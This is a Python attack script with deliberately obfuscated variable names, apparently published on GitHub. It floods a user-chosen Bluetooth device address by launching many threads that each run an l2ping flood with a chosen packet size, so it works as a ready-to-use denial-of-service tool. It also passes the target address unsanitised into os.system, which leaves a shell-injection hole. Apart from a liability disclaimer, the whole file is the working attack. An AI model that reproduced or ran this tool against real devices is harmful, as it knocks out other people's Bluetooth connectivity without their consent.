import os #line:1
import threading #line:2
import time #line:3
def DOS (OO00O0OO000OO0OO0 ,O0O0O0OO0000O0O00 ):#line:4
    os .system ('l2ping -i hci0 -s '+str (O0O0O0OO0000O0O00 )+' -f '+OO00O0OO000OO0OO0 )#line:5
def printLogo ():#line:6
    print ('\x1b[37;4mhttps://github.com/root-cyborg127\x1b[0m')#line:7
    print ('\x1b[37;36m')#line:8
    print ('███   █       ▄   ▄███▄     ▄▄▄▄▄ ██   █▀▄▀█ █▀▄▀█ ')#line:9
    print ('█  █  █        █  █▀   ▀  ▄▀  █   █ █  █ █ █ █ █ █ ')#line:10
    print ('█ ▀ ▄ █     █   █ ██▄▄        █   █▄▄█ █ ▄ █ █ ▄ █ ')#line:11
    print ('█  ▄▀ ███▄  █   █ █▄   ▄▀  ▄ █    █  █ █   █ █   █ ')#line:12
    print ('███       ▀ █▄ ▄█ ▀███▀     ▀        █    █     █  ')#line:13
    print ('             ▀▀▀                    █    ▀     ▀   \x1b[45mV1.0\x1b[0m')#line:14
    print ('                                   ▀                ')#line:15
    print ('\x1b[0m')#line:16
def main ():#line:17
    printLogo ()#line:18
    time .sleep (0.1 )#line:19
    print ('')#line:20
    print ('\x1b[31mTHIS SOFTWARE IS PROVIDED "AS IS" WITHOUT WARRANTY OF ANY KIND. YOU MAY USE THIS SOFTWARE AT YOUR OWN RISK. THE USE IS COMPLETE RESPONSIBILITY OF THE END-USER. THE DEVELOPERS ASSUME NO LIABILITY AND ARE NOT RESPONSIBLE FOR ANY MISUSE OR DAMAGE CAUSED BY THIS PROGRAM.')#line:21
    if (input ("\x1b[37;4mDo you agree? (y/n) >\x1b[0m ")in ['y','Y']):#line:22
        time .sleep (0.1 )#line:23
        os .system ('clear')#line:24
        printLogo ()#line:25
        print ('')#line:26
        OOOO00O0O0O0000O0 =input ('Target addr > ')#line:27
        if len (OOOO00O0O0O0000O0 )<1 :#line:28
            print ('[!] ERROR: Target addr is missing')#line:29
            exit (0 )#line:30
        try :#line:31
            OOOOOOOO0OO0O0OOO =int (input ('Packages size > '))#line:32
        except :#line:33
            print ('[!] ERROR: Packages size must be an integer')#line:34
            exit (0 )#line:35
        try :#line:36
            OOO0OOOOOOO0OOOOO =int (input ('Threads count > '))#line:37
        except :#line:38
            print ('[!] ERROR: Threads count must be an integer')#line:39
            exit (0 )#line:40
        print ('')#line:41
        os .system ('clear')#line:42
        print ("\x1b[31m[*] Starting DOS attack in 3 seconds...")#line:43
        for OO0O0OO000OOO0O00 in range (0 ,3 ):#line:44
            print ('[*] '+str (3 -OO0O0OO000OOO0O00 ))#line:45
            time .sleep (1 )#line:46
        os .system ('clear')#line:47
        print ('[*] Building threads...\n')#line:48
        for OO0O0OO000OOO0O00 in range (0 ,OOO0OOOOOOO0OOOOO ):#line:49
            print ('[*] Built thread №'+str (OO0O0OO000OOO0O00 +1 ))#line:50
            threading .Thread (target =DOS ,args =[str (OOOO00O0O0O0000O0 ),str (OOOOOOOO0OO0O0OOO )]).start ()#line:51
        print ('[*] Built all threads...')#line:52
        print ('[*] Starting...')#line:53
    else :#line:54
        print ('Bip bip')#line:55
        exit (0 )#line:56
if __name__ =='__main__':#line:57
    try :#line:58
        os .system ('clear')#line:59
        main ()#line:60
    except KeyboardInterrupt :#line:61
        time .sleep (0.1 )#line:62
        print ('\n[*] Aborted')#line:63
        exit (0 )#line:64
    except Exception as e :#line:65
        time .sleep (0.1 )#line:66
        print ('[!] ERROR: '+str (e ))#line:67
